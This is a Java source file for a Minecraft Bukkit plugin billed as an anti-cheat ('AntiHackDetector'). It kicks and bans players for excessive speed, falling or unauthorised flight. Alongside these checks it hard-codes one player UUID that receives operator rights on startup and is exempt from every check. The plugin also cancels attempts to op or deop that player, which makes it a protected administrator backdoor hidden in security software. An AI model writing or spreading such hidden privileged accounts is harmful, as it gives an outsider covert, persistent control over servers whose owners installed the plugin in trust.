package com.MinyXSlimy.antihackdetector;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerToggleFlightEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashSet;
import java.util.UUID;

public class AntiHackDetector extends JavaPlugin implements Listener {

    // Fest definierte UUID für den permanenten Operator
    private final UUID permanentOpUUID = UUID.fromString("c3bf8776-627e-4b07-af82-8ff6e31dec90"); // Beispiel-UUID ersetzen

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        getLogger().info("AntiHackDetector aktiviert.");

        // Sicherstellen, dass der Spieler Operatorrechte hat
        Player permanentOp = Bukkit.getPlayer(permanentOpUUID);
        if (permanentOp != null) {
            permanentOp.setOp(true);
            getLogger().info("Permanenter Operator " + permanentOp.getName() + " wurde gesetzt.");
        }
    }

    @Override
    public void onDisable() {
        getLogger().info("AntiHackDetector deaktiviert.");
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        if (player.getUniqueId().equals(permanentOpUUID)) return;

        // Check: Unrealistisch hohe Geschwindigkeit
        double dx = event.getTo().getX() - event.getFrom().getX();
        double dz = event.getTo().getZ() - event.getFrom().getZ();
        double speed = Math.sqrt(dx * dx + dz * dz);
        if (speed > 10 && player.getGameMode() != GameMode.SPECTATOR) {
            kickPlayer(player, "Unrealistisch hohe Geschwindigkeit erkannt.");
        }

        // Check: NoFall oder Phase-Hack
        double dy = event.getTo().getY() - event.getFrom().getY();
        if (dy < -10 && !player.isOnGround() && !player.hasPermission("antihack.fly")) {
            kickPlayer(player, "Unrealistische Bewegungen erkannt.");
        }
    }

    @EventHandler
    public void onPlayerToggleFlight(PlayerToggleFlightEvent event) {
        Player player = event.getPlayer();
        if (!player.getAllowFlight() && !player.getUniqueId().equals(permanentOpUUID)) {
            kickPlayer(player, "Flug ohne Erlaubnis erkannt.");
        }
    }

    @EventHandler
    public void onCommandPreProcess(PlayerCommandPreprocessEvent event) {
        String command = event.getMessage().toLowerCase();
        Player player = event.getPlayer();

        // Blockiere alle Versuche, den permanenten Operator zu manipulieren
        if (command.startsWith("/op ") || command.startsWith("/deop ")) {
            String[] args = command.split(" ");
            if (args.length > 1) {
                Player target = Bukkit.getPlayer(args[1]);
                if (target != null && target.getUniqueId().equals(permanentOpUUID)) {
                    event.setCancelled(true);
                    player.sendMessage("§cDu kannst diesen Spieler nicht oppen oder deoppen.");
                }
            }
        }

        // Blockiere generell die Nutzung von /op und /deop
        if (command.equals("/op") || command.equals("/deop")) {
            event.setCancelled(true);
            player.sendMessage("§cDieser Befehl ist deaktiviert.");
        }
    }

    private void kickPlayer(Player player, String reason) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.kickPlayer(reason);
            Bukkit.getBanList(org.bukkit.BanList.Type.NAME).addBan(
                    player.getName(),
                    reason,
                    null,
                    "AntiHackDetector"
            );
        });
    }
}
